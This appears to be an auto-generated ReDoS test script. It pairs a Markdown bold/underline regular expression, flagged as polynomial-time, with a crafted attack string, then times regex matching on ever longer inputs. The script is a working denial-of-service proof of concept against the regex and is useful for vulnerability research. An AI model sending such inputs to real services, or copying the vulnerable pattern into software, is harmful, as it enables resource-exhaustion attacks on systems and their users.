/* 7889
 * (?:(?:(?<=[\s^,(])\*(?=\S)(?!_)(?<bold>.+?)(?<!_)(?<=\S)\*(?=[\s$,.?!]))|(?:(?<=[\s^,(])_(?=\S)(?!\*)(?<underline>.+?)(?<!\*)(?<=\S)_(?=[\s$,.?!]))|(?:(?<=[\s^,(])(?:\*_|_\*)(?=\S)(?<boldunderline>.+?)(?<=\S)(?:\*_|_\*)(?=[\s$,.?!])))
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:"<= *=!!_1<!_<=!*= <= _=!!*1<!*<=!_= "+"<= *_=!"*5000+"! _1SLQ_2"
 */
var REGEX = /(?:(?:(?<=[\s^,(])\*(?=\S)(?!_)(?<bold>.+?)(?<!_)(?<=\S)\*(?=[\s$,.?!]))|(?:(?<=[\s^,(])_(?=\S)(?!\*)(?<underline>.+?)(?<!\*)(?<=\S)_(?=[\s$,.?!]))|(?:(?<=[\s^,(])(?:\*_|_\*)(?=\S)(?<boldunderline>.+?)(?<=\S)(?:\*_|_\*)(?=[\s$,.?!])))/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '<= *=!!_1<!_<=!*= <= _=!!*1<!*<=!_= ' + '<= *_=!'.repeat(i*10000) + '! _1SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}